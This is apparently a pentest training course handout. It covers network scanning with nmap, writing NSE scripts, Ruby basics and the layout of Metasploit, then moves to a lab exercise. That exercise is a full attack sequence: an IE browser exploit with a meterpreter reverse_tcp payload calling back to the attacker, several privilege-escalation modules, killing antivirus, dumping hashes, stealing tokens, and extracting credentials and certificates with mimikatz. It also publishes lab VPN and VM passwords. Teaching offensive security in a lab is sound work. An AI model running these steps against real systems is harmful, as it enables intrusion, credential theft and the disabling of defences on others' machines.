########################################
# Advanced Pentester Night School      #
# By Joe McCray of Strategic Security  #
########################################


#########################
# Class Virtual Machine #
#########################
 
 
Here is the VMWare virtual machine for the class:
 
https://s3.amazonaws.com/infosecaddictsvirtualmachines/InfoSecAddictsVM.zip
user:      infosecaddicts
pass:      infosecaddicts


Let's have you connect to the VPN. I wanted to make sure that I did some of the stuff on my local virtual machines because I want you to do the hunting for vulnerable hosts to attack.
If I attack the live targets in the lab then I'll end up giving away a lot of the little secrets that I want you to discover.
 



So, let's start with some lab fun (just a little bit)...lol. Here are the instructions for connecting to the VPN:
https://s3.amazonaws.com/infosecaddictsfiles/Strategic-Security-2017-VPN-Info.pdf
vpn username: {first_initial.last_name}  example: j.mccray
vpn password: !@#$vpn4321VPN



If you wants some scanning tips you should take a look at the following document:
https://s3.amazonaws.com/infosecaddictsfiles/LabNetworkScanningV4.pdf



#########################
# Building a quick list #
######################### 
cd ~
echo bob >> list.txt
echo jim >> list.txt
echo joe >> list.txt
echo tim >> list.txt
echo admin >> list.txt
echo hello >> list.txt
echo rob >> list.txt
echo test >> list.txt
echo aaaaaa >> list.txt
echo larry >> list.txt
echo mario >> list.txt
echo jason >> list.txt
echo john >> list.txt




#######################
# Scanning Techniques #
#######################
sudo nmap -sL 172.31.6.0/24
     infosecaddicts
 
cd ~/toolz
 
wget --no-check-certificate https://raw.githubusercontent.com/BenDrysdale/ipcrawl/master/ipcrawl.c
 
gcc ipcrawl.c -o ipcrawl
 
chmod 777 ipcrawl
 
./ipcrawl 172.31.6.1 172.31.6.254
 
 
 
wget --no-check-certificate https://dl.packetstormsecurity.net/UNIX/scanners/propecia.c
 
gcc propecia.c -o propecia
 
sudo cp propecia /bin
     infosecaddicts
 
propecia 172.31.6 22

propecia 172.31.6 80

propecia 172.31.6 443
 
propecia 172.31.6 3389
 
nmap -Pn -sV -T 5 -oG - -p 21,22,80,443,1433,3389 172.31.6.* | grep open
 
nmap -Pn -sV -T 5 -oG - -p 21,22,80,443,1433,3389 172.31.6.* | awk '/open/{print $2 " " $3}'
 
nmap -Pn -sV -T 5 -oG - -p 21,22,80,443,1433,3389 172.31.6.* | awk '/open/{print $2}' | wc -l
 
nmap -Pn -sV -T 5 -oG - -p 21,22,80,443,1433,3389 172.31.6.* | awk '/open/{print $2}'
 
nmap -Pn -sV -T 5 -oG - -p 21,22,80,443,1433,3389 172.31.6.* | awk '/open/{print $2}' > ~/labnet-ip-list.txt
 
cat ~/labnet-ip-list.txt
 
#################################################
# Screenshotting the Web Servers in the Network #
#################################################
cd ~/toolz/
mkdir labscreenshots
cd labscreenshots/
 
 
wget https://s3.amazonaws.com/infosecaddictsfiles/wkhtmltox-0.12.4_linux-generic-amd64.tar.xz
tar xf wkhtmltox-0.12.4_linux-generic-amd64.tar.xz
cd wkhtmltox/bin/
sudo cp wkhtmltoimage /usr/local/bin/wkhtmltoimage-i386
 
 
cd ~/toolz/
git clone git://github.com/SpiderLabs/Nmap-Tools.git
cd Nmap-Tools/NSE/
 
sudo cp http-screenshot.nse /usr/share/nmap/scripts/
     infosecaddicts
 
sudo nmap --script-updatedb
     infosecaddicts
 
 
cd ~/toolz/labscreenshots/
sudo nmap -Pn -T 5 -p 80 -A --script=http-screenshot 172.31.6.0/24 -iL /home/infosecaddicts/labnet-ip-list.txt
     infosecaddicts
 
 
 
 
vi screenshots.sh
 
#!/bin/bash
printf "<HTML><BODY><BR>" > labnet-port-80-screenshots.html
ls -1 *.png | awk -F : '{ print $1":"$2"\n<BR><IMG SRC=\""$1"%3A"$2"\" width=400><BR><BR>"}' >> labnet-port-80-screenshots.html
printf "</BODY></HTML>" >> labnet-port-80-screenshots.html
 
 
 
 
 
sh screenshots.sh
 
 
python -m SimpleHTTPServer
 
 
--- Now browse to the IP of your Linux machine on port 8000 (http://192.168.200.157:8000/labnet-port-80-screenshots.html):
http://Ubuntu-VM-IP:8000/labnet-port-80-screenshots.html
 
 
 
 
##########################
# Nmap NSE tricks to try #
##########################
sudo nmap -Pn -n --open -p21 --script=banner,ftp-anon,ftp-bounce,ftp-proftpd-backdoor,ftp-vsftpd-backdoor 172.31.6.0/24
     infosecaddicts
 
sudo nmap -Pn -n --open -p22 --script=sshv1,ssh2-enum-algos 172.31.6.0/24
     infosecaddicts
 
sudo nmap -Pn -n -sU --open -p53 --script=dns-blacklist,dns-cache-snoop,dns-nsec-enum,dns-nsid,dns-random-srcport,dns-random-txid,dns-recursion,dns-service-discovery,dns-update,dns-zeustracker,dns-zone-transfer 172.31.6.0/24
     infosecaddicts
 
sudo nmap -Pn -n --open -p111 --script=nfs-ls,nfs-showmount,nfs-statfs,rpcinfo 172.31.6.0/24
     infosecaddicts
 
sudo nmap -Pn -n --open -p445 --script=msrpc-enum,smb-enum-domains,smb-enum-groups,smb-enum-processes,smb-enum-sessions,smb-enum-shares,smb-enum-users,smb-mbenum,smb-os-discovery,smb-security-mode,smb-server-stats,smb-system-info,smbv2-enabled,stuxnet-detect 172.31.6.0/24
     infosecaddicts
 
sudo nmap -Pn -n --open -p1433 --script=ms-sql-dump-hashes,ms-sql-empty-password,ms-sql-info 172.31.6.0/24
     infosecaddicts
 
sudo nmap -Pn -n --open -p1521 --script=oracle-sid-brute --script oracle-enum-users --script-args oracle-enum-users.sid=ORCL,userdb=orausers.txt 172.31.6.0/24
     infosecaddicts
 
sudo nmap -Pn -n --open -p3306 --script=mysql-databases,mysql-empty-password,mysql-info,mysql-users,mysql-variables 172.31.6.0/24
     infosecaddicts
 
sudo nmap -Pn -n --open -p3389 --script=rdp-vuln-ms12-020,rdp-enum-encryption 172.31.6.0/24
     infosecaddicts
 
sudo nmap -Pn -n --open -p5900 --script=realvnc-auth-bypass,vnc-info 172.31.6.0/24
     infosecaddicts
 
sudo nmap -Pn -n --open -p6000-6005 --script=x11-access 172.31.6.0/24
     infosecaddicts
 
sudo nmap -Pn -n --open -p27017 --script=mongodb-databases,mongodb-info 172.31.6.0/24
     infosecaddicts
 
 
sudo nmap -sV -oA nse --script-args=unsafe=1 --script-args=unsafe  --script "auth,brute,discovery,exploit,external,fuzzer,intrusive,malware,safe,version,vuln and not(http-slowloris or http-brute or http-enum or http-form-fuzzer)" 172.31.6.0/24
     infosecaddicts
 
 





##################
# Day 1 Homework #
##################
Take screenshots of you performing all of the tasks above


#####################################
# Writing Your Own Nmap NSE Scripts #
#####################################
 
 
----------------------------------------------------------------------
sudo vi /usr/share/nmap/scripts/intro-nse.nse
 
-- The Head Section --
-- The Rule Section --
portrule = function(host, port)
    return port.protocol == "tcp"
            and port.number == 80
            and port.state == "open"
end
 
-- The Action Section --
action = function(host, port)
    return "CyberWar!"
end
----------------------------------------------------------------------
 
- Ok, now that we've made that change let's run the script
sudo nmap --script=/usr/share/nmap/scripts/intro-nse.nse infosecaddicts.com -p 22,80,443
 
 
 
 
 
 
----------------------------------------------------------------------
sudo vi /usr/share/nmap/scripts/intro-nse.nse
 
-- The Head Section --
local shortport = require "shortport"
 
-- The Rule Section --
portrule = shortport.http
 
 
-- The Action Section --
action = function(host, port)
    return "CyberWar!"
end
----------------------------------------------------------------------
 
- Ok, now that we've made that change let's run the script
sudo nmap --script=/usr/share/nmap/scripts/intro-nse.nse infosecaddicts.com -p 22,80,443
 
 
 
 
 
 
 
- OK, now let's have some fun with my buddy Carlos Perez's website which you should have been looking at quite a lot if you were trying to get Ruby 2.1.5 working last year.
 
----------------------------------------------------------------------
sudo vi /usr/share/nmap/scripts/intro-nse.nse
 
-- The Head Section --
local shortport = require "shortport"
local http = require "http"
 
-- The Rule Section --
portrule = shortport.http
 
-- The Action Section --
action = function(host, port)
 
    local uri = "/installing-metasploit-in-ubunt/"
    local response = http.get(host, port, uri)
    return response.status
 
end
----------------------------------------------------------------------
 
- Ok, now that we've made that change let's run the script
sudo nmap --script=/usr/share/nmap/scripts/intro-nse.nse www.darkoperator.com -p 22,80,443
 
 
 
 
----------------------------------------------------------------------
sudo vi /usr/share/nmap/scripts/intro-nse.nse
 
-- The Head Section --
local shortport = require "shortport"
local http = require "http"
 
-- The Rule Section --
portrule = shortport.http
 
-- The Action Section --
action = function(host, port)
 
    local uri = "/installing-metasploit-in-ubunt/"
    local response = http.get(host, port, uri)
 
    if ( response.status == 200 ) then
        return response.body
    end
 
end
----------------------------------------------------------------------
 
- Ok, now that we've made that change let's run the script
sudo nmap --script=/usr/share/nmap/scripts/intro-nse.nse www.darkoperator.com -p 22,80,443
 
 
 
 
 
 
 
 
 
----------------------------------------------------------------------
sudo vi /usr/share/nmap/scripts/intro-nse.nse
 
-- The Head Section --
local shortport = require "shortport"
local http = require "http"
local string = require "string"
 
-- The Rule Section --
portrule = shortport.http
 
-- The Action Section --
action = function(host, port)
 
    local uri = "/installing-metasploit-in-ubunt/"
    local response = http.get(host, port, uri)
 
    if ( response.status == 200 ) then
        local title = string.match(response.body, "Installing Metasploit in Ubuntu and Debian")
        return title
    end
 
end
----------------------------------------------------------------------
 
- Ok, now that we've made that change let's run the script
sudo nmap --script=/usr/share/nmap/scripts/intro-nse.nse www.darkoperator.com -p 22,80,443
 
 
 
 
 
 
 
----------------------------------------------------------------------
sudo vi /usr/share/nmap/scripts/intro-nse.nse
 
-- The Head Section --
local shortport = require "shortport"
local http = require "http"
local string = require "string"
 
-- The Rule Section --
portrule = shortport.http
 
-- The Action Section --
action = function(host, port)
 
    local uri = "/installing-metasploit-in-ubunt/"
    local response = http.get(host, port, uri)
 
    if ( response.status == 200 ) then
        local title = string.match(response.body, "Installing Metasploit in Ubuntu and Debian")
 
        if (title) then
            return "Vulnerable"
        else
            return "Not Vulnerable"
        end
    end
end
 
----------------------------------------------------------------------
 
- Ok, now that we've made that change let's run the script
sudo nmap --script=/usr/share/nmap/scripts/intro-nse.nse www.darkoperator.com -p 22,80,443



##################
# Day 2 Homework #
##################
Take screenshots of you performing all of the day 2 tasks above



############################################################
# Section 1: Ruby Fundamentals and Metasploit Architecture #
############################################################
 
################################
# Chapter 1: Ruby Fundamentals #
################################
 
 
 
- Ruby is a general-purpose, object-oriented programming language, which was created by Yukihiro Matsumoto, a computer
scientist and programmer from Japan. It is a cross-platform dynamic language.
 
- The major implementations of this language are Ruby MRI, JRuby, HotRuby, IronRuby, MacRuby, etc. Ruby
on Rails is a framework that is written in Ruby.
 
- Ruby's file name extensions are .rb and .rbw.
 
- official website of this
 
- language: www.ruby-lang.org.
 
 
- interactive Shell called Ruby Shell
 
 
- Installing and Running IRB
 
 
- open up the interactive console and play around.
 
 
irb
 
 
 
- Math, Variables, Classes, Creating Objects and Inheritance
 
 
# following arithmetic operators:
- Addition operator (+) — 10 + 23
- Subtraction operator (-) — 1001 - 34
- Multiplication operator (*) — 5 * 5
- Division operator (/) — 12 / 2
 
 
 
# Now let's cover some variable techniques. In Ruby, you can assign a value to a variable using the assignment
operator. '=' is the assignment operator. In the following example, 25 is assigned to x. Then x is incremented by
30. Again, 69 is assigned to y, and then y is incremented by 33.
 
x = 25
x + 30
y = 69
y+33
 
 
 
 
- Let's look at creating classes and creating objects.
 
- Here, the name of the class is infosecaddicts. An object has its properties and methods.
 
 
 
class Attack
attr_accessor :of, :sqli, :xss
end
 
- Now that we have created the classes let's create the objects
 
first_attack = Attack.new
first_attack.of = "stack"
first_attack.sqli = "blind"
first_attack.xss = "dom"
puts first_attack.of
puts first_attack.sqli
puts first_attack.xss
 
 
 
 
 
- Let's work on some inheritance that will help make your programming life easier. When we have multiple classes,
inheritance becomes useful. In simple words, inheritance is the classification of classes. It is a process by which
one object can access the properties/attributes of another object of a different class. Inheritance makes your
programming life easier by maximizing code reuse.
 
 
 
class Exploitframeworks
attr_accessor :scanners, :exploits, :shellcode, :postmodules
end
class Metasploit < Exploitframeworks
end
class Canvas < Exploitframeworks
end
class Coreimpact < Exploitframeworks
end
class Saint < Exploitframeworks
end
class Exploitpack < Exploitframeworks
end
 
 
 
 
 
- Methods, More Objects, Arguments, String Functions and Expression Shortcuts
 
- Let's create a simple method. A method is used to perform an action and is generally called with an object.
 
- Here, the name of the method is 'learning'. This method is defined inside the Msfnl class. When it is called,
it will print this string: "We are Learning how to PenTest"
 
- An object named 'bo' is created, which is used to call the method.
 
 
   
class Msfnl
def learning
puts "We are Learning how to PenTest"
end
end
 


- Now let's define an object for our Method
 
joe = Msfnl.new
joe.learning
 
 
 
 
- An argument is a value or variable that is passed to the function while calling it. In the following example, while
calling the puts() function, we are sending a string value to the function. This string value is used by the
function to perform some particular operations.
 
puts ("Pentesting")
 
 
 

 
- shortcuts. +=, *= are the shortcuts. These operators are also called abbreviated
assignment operators. Use the shortcuts to get the effect of two statements in just one. Consider the following
statements to understand the shortcuts.
 
g = 70
g = g+44
g += 33
 
- In the above statement, g is incremented by 33 and then the total value is assigned to g.
 
g *= 3
 
- In the above statement, g is multiplied with 3 and then assigned to g.
 
- Example
 
- Comparison Operators, Loops, Data Types, and Constants
 
- Comparison operators are used for comparing one variable or constant with another variable or constant. We will show
how to use the following comparison operators.
'Less than' operator (<): This operator is used to check whether a variable or constant is less than another
variable or constant. If it's less than the other, the 'less than' operator returns true.
'Equal to' operator (==): This operator is used to check whether a variable or constant is equal to another variable
or constant. If it's equal to the other, the 'equal to' operator returns true.
'Not equal to' operator (!=): This operator is used to check whether a variable or constant is not equal to another
variable or constant. If it's not equal to the other, the 'not equal to' operator returns true.
 
 
numberofports = 55
puts "number of ports found during scan" if numberofports < 300
numberofports = 400
puts "number of ports found during scan" if numberofports < 300
puts "number of ports found during scan" if numberofports == 300
puts "number of ports found during scan" if numberofports != 300
Example
 
 
- the 'OR' operator and the 'unless' keyword. This symbol '||' represents the logical 'OR' operator.
 
- This operator is generally used to combine multiple conditions.
- In case of two conditions, if both or any of the conditions is true, the 'OR'operator returns true. Consider the
 
- following example to understand how this operator works.
 
ports = 100
puts "number of ports found on the network" if ports<100 || ports>200
puts "number of ports found on the network" if ports<100 || ports>75


# unless

portsbelow1024 = 50
puts "If the ports are below 1024" unless portsbelow1024 < 1000
puts "If the ports are below 1024" unless portsbelow1024 < 1055
puts "If the ports are below 1024" unless portsbelow1024 < 20
 
 
- The 'unless' keyword is used to do something programmatically unless a condition is true.
 
 
 
- Loops are used to execute statement(s) repeatedly. Suppose you want to print a string 10 times.
 
- See the following example to understand how a string is printed 10 times on the screen using a loop.
 
10.times do puts "infosecaddicts" end

# Or use the curly braces

10.times {puts "infosecaddicts"}
 
 
 
- Changing Data Types: Data type conversion is an important concept in Ruby because it gives you flexibility while
working with different data types. Data type conversion is also known as type casting.
 
 
 
- In the following example, a and b are integers. So when a is divided by b, an integer division is performed. As a
result, 23/25 becomes 0.
 
- On the other hand, the integer variables c and d are converted to float. So the division gives the result in decimal
points.
 
24/4
14.0/5.0
a = 23
b = 25
print a/b
c = 26
d = 33
print c.to_f/d.to_f
 
 
 
 
- Constants: Unlike variables, the values of constants remain fixed during the program interpretation. So if you
change the value of a constant, you will see a warning message.
 
 
 
 
- Multiple Line String Variable, Interpolation, and Regular Expressions
 
- A multiple line string variable lets you assign the value to the string variable through multiple lines.
 
infosecaddicts = <<mark
welcome
to the
best
metasploit
course
on the
market
mark
puts infosecaddicts
 
 
 
- Interpolation lets you evaluate any placeholder within a string, and the placeholder is replaced with the value that
it represents. So whatever you write inside #{ } will be evaluated and the value will be replaced at that position.
Examine the following example to understand how interpolation works in Ruby.
 
 
 
a = 4
b = 6
puts "a * b = a*b"
puts " #{a} * #{b} = #{a*b} "
person = "Joe McCray"
puts "IT Security consultant person"
puts "IT Security consultant #{person}"
 
- Notice that the placeholders inside #{ } are evaluated and they are replaced with their values.
 
 
- Regular expression is a powerful technique for text searching and text manipulation. Ruby provides built-in support
for regular expressions through the Regexp class. So the regular expressions in Ruby are the objects of Regexp type.
 
 
 
- In regular expressions, we define patterns to perform text search and advanced text manipulations. String literals
and metacharacters constitute a pattern. // characters mark the beginning and end of a pattern in Ruby.
The following example shows how the substring "today"
is placed in the main string.
 
a = "Woot Woot, we are learning regular expressions!!"
puts a.sub(/^..../, 'Today')
puts a.sub(/^..../, 'Today')
 
 
 
- Let's Loop the expressions. This example shows how to loop the expressions.
 
a.scan(/...../) {|w| puts w}
a.scan(/\S\S/) {|w| puts w}
 
 
 
- Character classes
 
infosecaddicts = "I Scanned 45 hosts and found 500 vulnerabilities"
"I love metasploit and what it has to offer!".scan(/[lma]/) {|y| puts y}
"I love metasploit and what it has to offer!".scan(/[a-m]/) {|y| puts y}
 
 
 
- Arrays, Push and Pop, and Hashes
 
 
- In the following example, numbers is an array that holds 6 integer numbers.
 
 
 
numbers = [2,4,6,8,10,100]
puts numbers[0]
puts numbers[4]
numbers[2] = 150
puts numbers
 
 
 
 
- Now we will show how you can implement a stack using an array in Ruby. A stack has two operations - push and pop.
 
 
 
framework = []
framework << "modules"
framework << "exploits"
framework << "payloads"
framework.pop
 
 
- Hash is a collection of elements, which is like the associative array in other languages. Each element has a key
that is used to access the element.
 
 
- Hash is a Ruby object that has its built-in methods. The methods make it easy to work with hashes.
In this example, 'metasploit' is a hash. 'exploits', 'microsoft', 'Linux' are the keys, and the following are the
respective values: 'what module should you use', 'Windows XP' and 'SSH'.
 
 
metasploit = {'exploits' => 'what module should you use', 'microsoft' => 'Windows XP', 'Linux' => 'SSH'}
print metasploit.size
print metasploit["microsoft"]
metasploit['microsoft'] = 'redhat'
print metasploit['microsoft']
 
 
 
- Writing Ruby Scripts
 
 
- Let's take a look at one of the ruby modules and see exactly now what it is doing. Now explain to me exactly what
this program is doing. If we take a look at the ruby program what you find is that it is a TCP port scanner that
someone made to look for a specific port. The port that it is looking for is port 21 FTP.
 
cd ~/toolz/metasploit/modules/auxiliary/scanner/portscan
ls
ack.rb  ftpbounce.rb  syn.rb  tcp.rb  xmas.rb
 
- Lets look at tcp.rb
   
 
 
- Let's take the time now to create and design our own port scanner what we will design here is a port scanner that
will scan for port up to 0-1024. And we will add a function in there for the port scanner to prompt us stating OPEN
port if it detects it. This is a pretty basic script, but it will help you in the event that you need to write
something on the fly.
 
 
 
- PortScanner.rb :
 
require 'socket'
require 'timeout'
 
puts "Enter IP Address to Scan:"
ipaddress = gets
 
1.upto(1024) {|port|
  begin
    timeout(5) do
      TCPSocket.open(ipaddress.chop, port)
    end
    puts "Response/Port Open: #{port}"
  rescue Timeout::Error
    # uncomment the following line to show closed ports (noisy!)
    #puts "No Response /Port closed: #{port}"
  rescue
    # uncomment the following line to show closed ports (noisy!)
    #puts "No Response /Port closed: #{port}"
  end
}
 
 
 
 
 
 
 
 
######################################
# Chapter 2: Metasploit Fundamentals #
######################################
 
- Let's take a little look at Metasploit Framework
 
- First, we should take note of the different directories, the Modular Architecture.
 
The modules that make up the Modular Architecture are
Exploits
Auxiliary
Payload
Encoder
Nops
 
 
Important directories to keep in mind for Metasploit, in case we'd like to edit different modules, or add our own,
 
are
 
Modules
Scripts
Plugins
External
Data
Tools
 
- Let's take a look inside the Metasploit directory and see what's the
 
cd ~/toolz/metasploit
ls
 
 
 
 
- Now let's take a look inside the Modules directory and see what's there.
 
cd ~/toolz/metasploit/modules
ls
 
 
       
The auxiliary directory is where the things like our port-scanners will be, or any module that we can run that does
not necessarily need to - have a shell or session started on a machine.
 
The exploits directory has our modules that we need to pop a shell on a box.
The external directory is where we can see all of the modules that use external libraries from tools Metasploit uses
like Burp Suite
- Let's take a look at the external directory
 
cd ~/toolz/metasploit/external
ls
 
 
- Our data directory holds helper modules for Metasploit to use with exploits or auxiliary modules.
 
cd ~/toolz/metasploit/data
ls
 
 
- For example, the wordlist directory holds files that have wordlists in them for brute-forcing logins or doing DNS
brute-forcing
 
cd ~/toolz/metasploit/data/wordlists
ls
   
 
- The Meterpreter directory inside of the data directory houses the DLLs used for the functionality of Meterpreter
once a session is created.
 
cd ~/toolz/metasploit/data/meterpreter
ls
 

 
- The scripts inside the scripts/Meterpreter directory are scripts that Meterpreter uses for post-exploitation, things
like escalating privileges and dumping hashes.
 
These are being phased out, though, and post-exploitation modules are what is being more preferred.
The next important directory that we should get used to is the 'tools' directory. Inside the tools directory we'll
find a bunch of different ruby scripts that help us on a pentest with things ranging from creating a pattern of code
for creating exploits, to a pattern offset script to find where at in machine language that we need to put in our
custom shellcode.
 
The final directory that we'll need to keep in mind is the plugins directory, which houses all the modules that have
to do with other programs to make things like importing and exporting reports simple.
Now that we have a clear understanding of what all of the different directories house, we can take a closer look at
the exploits directory and get a better understanding of how the directory structure is there, so if we make our own
modules we're going to have a better understanding of where everything needs to go.
 
cd ~/toolz/metasploit/modules/exploits
ls
 
 
 
- The exploits directory is split up into several different directories, each one housing exploits for different types
of systems. I.E. Windows, Unix, OSX, dialup and so on.
Likewise, if we were to go into the 'windows' directory, we're going to see that the exploits have been broken down
into categories of different types of services/programs, so that you can pick out an exploit specifically for the
service you're trying to exploit. Let's dig a little deeper into the auxiliary directory and see what all it holds
for us.
 
cd ~/toolz/metasploit/modules/auxiliary/
ls
     
 
 
- And a little further into the directory, let's take a look at what's in the scanner directory
 
cd ~/toolz/metasploit/modules/auxiliary/scanner/
ls
 
- And one more folder deeper into the structure, let's take a look in the portscan folder
 
cd ~/toolz/metasploit/modules/auxiliary/scanner/portscan
ls
   
 
- If we run 'cat tcp.rb' we'll find that this module is simply a TCP scanner that will find tcp ports that are open
and report them back to us in a nice, easily readable format.
 
cat tcp.rb
   
 
 
- Just keep in mind that all of the modules in the auxiliary directory are there for information gathering and for use
once you have a session on a machine.
Taking a look at the payload directory, we can see all the available payloads, which are what run after an exploit
succeeds.
 
cd ~/toolz/metasploit/modules/payloads/
ls
   
 
 
- There are three different types of payloads: single, stagers, and staged. Each type of payload has a different
application for it to be used as.
Single payloads do everything you need them to do at one single time, so they call a shell back to you and let you
do everything once you have that shell calling back to you.
Stagers are required for limited payload space so that the victim machine will call back to your attack box to get
the rest of the instructions on what it's supposed to do. The first stage of the payload doesn't require all that
much space to just call back to the attacking machine to have the rest of the payload sent to it, mainly being used
to download Stages payloads.
 
 
- Stages are downloaded by stagers and typically do complex tasks, like VNC sessions, Meterpreter sessions, or bind
shells.
 
cd ~/toolz/metasploit/modules/payloads/singles
cd windows
ls
 
 
 
- We can see several different payloads here that we can use on a windows system. Let's take a look at adduser.rb and
see what it actually does.
 
cat adduser.rb
 
Which when looking at the code, we can see that it will add a new user called "Metasploit" to the machine and give
the new user "Metasploit" a password of "Metasploit$1" Further down in the file we can actually see the command that
it gives Windows to add the user to the system.
 
 
- Stagers just connect to victim machine back to yours to download the Stages payload, usually with a
 
windows/shell/bind_tcp or windows/shell/reverse_tcp
 
cd ~/toolz/metasploit/modules/payloads/stagers
ls
   
 
 
- Again, we can see that we have stagers for multiple systems and code types.
 
ls windows/
   
 
 
As you can see, the stagers are mainly just to connect to the victim, to setup a bridge between us and the victim
machine, so we can upload or download our stage payloads and execute commands.
Lastly, we can go to our stages directory to see what all payloads are available for us to send over for use with
our stagers...
 
cd /toolz/metasploit/modules/payloads/stages
ls
   
 
 
Again, we can see that our stages are coded for particular operating systems and languages.
We can take a look at shell.rb and see the shellcode that would be put into the payload that would be staged on the
victim machine which would be encoded to tell the victim machine where to connect back to and what commands to run,
if any.
 
- Other module directories include nops, encoders, and post. Post modules are what are used in sessions that have
already been opened in meterpreter, to gain more information on the victim machine, collect hashes, or even tokens,
so we can impersonate other users on the system in hopes of elevating our privileges.
 
cd ~/toolz/metasploit/modules/post
ls
cd windows/
ls
   
 
 
Inside the windows directory we can see all the post modules that can be run, capture is a directory that holds all
the modules to load keyloggers, or grab input from the victim machine. Escalate has modules that will try to
escalate our privileges. Gather has modules that will try to enumerate the host to get as much information as
possible out of it. WLAN directory holds modules that can pull down WiFi access points that the victim has in
memory/registry and give you the AP names as well as the WEP/WPA/WPA2 key for the network.
 
##################
# Day 4 Homework #
##################
Please take screenshots of you doing the first 10 videos in this playlist
https://www.youtube.com/playlist?list=PL1512BD72E7C9FFCA




###################################################
# Section 2: Actually Using Metasploit (For real) #
###################################################
The Windows 7 VM required for this lab can be downloaded from here:
https://s3.amazonaws.com/infosecaddictsvirtualmachines/Win7x64.zip
    username: workshop
    password: password

##################################
# Basic Client-Side Exploitation #
##################################
 
echo j0e-r0x > /home/infosecaddicts/j0e-r0x.txt                   (You can of course replace j0e-r0x with yourname)
 
sudo /sbin/iptables -F
 
cd ~/toolz/metasploit
 
./msfconsole
 
use exploit/windows/browser/ie_cgenericelement_uaf
 
set ExitOnSession false
 
set URIPATH /ie8
 
set PAYLOAD windows/meterpreter/reverse_tcp
 
set LHOST CHANGEME-TO-YOUR-UBUNTU-IP                                            (Make sure you change this to your ubuntu ip address)
 
exploit -j
 
 
- Now from the Win7 host, use Internet Explorer 8 to connect to the exploit address (local address)
- given to you by metasploit.
 
- The address will be something like:
 
http://CHANGEME-TO-YOUR-UBUNTU-IP:8080/ie8                                            (Make sure you change this to your ubuntu ip address)
 
 
 
- This will simulate a victim clicking on your malicious link and being exploited with a browser exploit.
 
 
###########################
# Client-Side Enumeration #
###########################
 
 
- You can list the active sessions by typing:
 
sessions -l
 
 
 
 
- You can "interact" with any active session by typing sessions -i 3 (replace 3 with the session number you want to interact with)
 
 
sessions -i 1
 
 
 
 
 
- You should now see Metasploit's meterpreter prompt.
 
 
********************************** Figure out who and where you are **********************************
 
meterpreter> sysinfo
 
 
meterpreter> getuid
 
 
meterpreter> ipconfig
 
 
meterpreter> run post/windows/gather/checkvm
 
 
meterpreter> run get_local_subnets
 
 
 
********************************** Escalate privileges and get hashes **********************************
 
 
meterpreter> use priv
 
 
--Option 1: GetSystem
meterpreter> getsystem
 
--Option 2:
meterpreter > run post/windows/escalate/getsystem
 
--Option 3:
meterpreter> background
back
use post/windows/escalate/droplnk
set SESSION 1
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST CHANGEME-TO-YOUR-UBUNTU-IP                                            (Make sure you change this to your ubuntu ip address)
set LPORT 1234
exploit
 
--Option 4:
use exploit/windows/local/bypassuac
set SESSION 1
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST CHANGEME-TO-YOUR-UBUNTU-IP                                            (Make sure you change this to your ubuntu ip address)
set LPORT 12345
exploit
 
--Option 5:
use exploit/windows/local/service_permissions
set SESSION 1
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST CHANGEME-TO-YOUR-UBUNTU-IP                                            (Make sure you change this to your ubuntu ip address)
set LPORT 5555
exploit
 
--Option 6:
use exploit/windows/local/trusted_service_path
set SESSION 1
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST CHANGEME-TO-YOUR-UBUNTU-IP                                            (Make sure you change this to your ubuntu ip address)
set LPORT 4567
exploit
 
 
--Option 7:
use exploit/windows/local/ppr_flatten_rec
set SESSION 1
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST CHANGEME-TO-YOUR-UBUNTU-IP                                            (Make sure you change this to your ubuntu ip address)
set LPORT 7777
exploit
 
--Option 8:
use exploit/windows/local/ms_ndproxy
set SESSION 1
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST CHANGEME-TO-YOUR-UBUNTU-IP                                            (Make sure you change this to your ubuntu ip address)
set LPORT 7788
exploit
 
 
--Option 9:
use exploit/windows/local/ask
set SESSION 1
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST CHANGEME-TO-YOUR-UBUNTU-IP                                            (Make sure you change this to your ubuntu ip address)
set LPORT 7799
exploit
 
 
meterpreter > getuid
Server username: win7-64-victim\Workshop

meterpreter > getsystem
...got system (via technique 1).

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
 
meterpreter> run post/windows/gather/hashdump
 
meterpreter > ps                (search for a process running as NT AUTHORITY\SYSTEM)
 
meterpreter > migrate 2800      (your process id WILL NOT be 2800, but make sure you use one that is running at NT AUTHORITY\SYSTEM)

msf exploit(ask) > use post/windows/manage/killav

msf post(killav) > set SESSION 2

msf post(killav) > run

msf post(killav) > sessions -i 2

meterpreter> run post/windows/gather/hashdump 

meterpreter> run post/windows/gather/credentials/credential_collector
 
 
********************************** Steal Tokens **********************************
 
meterpreter > getsystem
 
meterpreter > use incognito
 
meterpreter > list_tokens -u
 
meterpreter > list_tokens -g
 
meterpreter > impersonate_token                         <-- choose who you want to impersonate but be sure to use 2 slashes in the name (ex: impersonate_token domain\\user)
 
meterpreter> getuid
 
 
************ Stealing credentials and certificates ************
- NOTE: Most of the stuff after 'kerberos' DOES NOT work, but is given here so you know the correct syntax to use when connected to AD or dealing with smart/CAC cards.
 
meterpreter > getsystem
 
meterpreter > load mimikatz
 
meterpreter > kerberos
 
meterpreter > mimikatz_command -f sekurlsa::logonPasswords -a "full"
 
meterpreter > msv                                                               <-- Your AD password
 
meterpreter > livessp                                                           <-- Your Windows8 password
 
meterpreter > ssp                                                               <-- Your outlook password
 
meterpreter > tspkg                                                             <-- Your AD password
 
meterpreter > wdigest                                                           <-- Your AD password
 
meterpreter > mimikatz_command -f crypto::listStores
 
meterpreter > mimikatz_command -f crypto::listCertificates
 
meterpreter > mimikatz_command -f crypto::exportCertificates CERT_SYSTEM_STORE_CURRENT_USER
 
meterpreter > mimikatz_command -f crypto::patchcapi
 
meterpreter> search -d <directory> -f <file-pattern>
 
 
********************************** Enumerate the host you are on **********************************
 
meterpreter > run post/windows/gather/enum_applications
 
meterpreter > run post/windows/gather/enum_logged_on_users
 
meterpreter > run post/windows/gather/usb_history
 
meterpreter > run post/windows/gather/enum_shares
 
meterpreter > run post/windows/gather/enum_snmp
 
meterpreter> reg enumkey -k HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
 
 
********************************** Prove access **********************************
 
meterpreter> upload /home/infosecaddicts/j0e-r0x.txt c:\\
 


********************************** Lateral Movement *******************************
 
 
